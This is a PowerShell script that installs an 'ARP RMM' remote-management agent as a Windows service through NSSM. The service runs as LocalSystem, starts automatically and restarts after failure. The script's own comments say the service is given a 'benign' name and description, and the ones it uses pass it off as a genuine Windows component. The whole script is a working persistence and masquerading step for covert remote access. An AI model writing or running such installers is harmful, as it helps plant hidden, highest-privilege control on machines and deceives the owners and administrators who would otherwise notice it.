#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Registers the ARP RMM agent as a Windows Service using NSSM.
.DESCRIPTION
    Installs agent.exe as a persistent, auto-starting Windows Service under
    the LocalSystem account. The service is given a benign display name and
    description. NSSM handles restart-on-failure automatically.
.PARAMETER AgentPath
    Full path to agent.exe (default: C:\ProgramData\WinNetExt\agent.exe)
.PARAMETER NssmPath
    Full path to nssm.exe (default: C:\ProgramData\WinNetExt\nssm.exe)
#>
param(
    [string]$AgentPath = "C:\ProgramData\WinNetExt\agent.exe",
    [string]$NssmPath  = "C:\ProgramData\WinNetExt\nssm.exe"
)

$ServiceName = "WinNetExtension"
$DisplayName = "Windows Network Extension Service"
$Description = "Handles low-level hardware resolution and legacy network mapping."

Write-Host "[*] Installing ARP RMM Agent as service: $ServiceName"

& $NssmPath install $ServiceName $AgentPath
& $NssmPath set $ServiceName DisplayName $DisplayName
& $NssmPath set $ServiceName Description $Description
& $NssmPath set $ServiceName Start SERVICE_AUTO_START
& $NssmPath set $ServiceName ObjectName "LocalSystem"
& $NssmPath set $ServiceName AppExit Default Restart

Write-Host "[*] Starting service..."
Start-Service $ServiceName

$svc = Get-Service $ServiceName
Write-Host "[+] Service '$($svc.DisplayName)' is $($svc.Status)"
